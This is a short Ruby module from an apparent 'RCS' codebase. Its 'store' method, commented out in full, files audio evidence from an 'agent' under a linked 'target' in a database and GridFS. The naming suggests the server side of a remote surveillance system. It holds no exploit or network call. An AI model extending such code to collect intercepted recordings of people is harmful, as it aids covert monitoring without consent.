# from RCS::Common
require 'rcs-common/trace'

module AudioEvidence
  
  def self.extended(base)
    base.send :include, InstanceMethods
    base.send :include, RCS::Tracer
    
    base.instance_exec do
      # default values
      
    end
  end
  
  module InstanceMethods
    def get_agent
      ::Item.agents.where({instance: info[:instance]}).first
    end
    
    def store
=begin
      agent = get_agent
      trace :debug, "found agent #{agent._id} for instance #{info[:instance]}"
      
      target = agent.get_parent
      trace :debug, "found target #{target._id} for agent #{agent._id}"
      
      ev = ::Evidence.dynamic_new target[:_id].to_s
      
      ev.agent_id = [ agent[:_id] ]
      ev.type = info[:type]
      
      ev.acquired = info[:acquired].to_i
      ev.received = info[:received].to_i
      ev.relevance = 0
      ev.blotter = false
      ev.note = ""
      
      ev.data = info[:data]
      
      # save the binary data (if any)
      unless info[:grid_content].nil?
        ev.data[:_grid_size] = info[:grid_content].bytesize
        ev.data[:_grid] = RCS::DB::GridFS.put(info[:grid_content], {filename: agent[:_id].to_s}, target[:_id].to_s) unless info[:grid_content].nil?
      end
      
      ev.save
      
      trace :debug, "saved evidence #{ev._id}"
=end
    end
  end

end # AudioEvidence
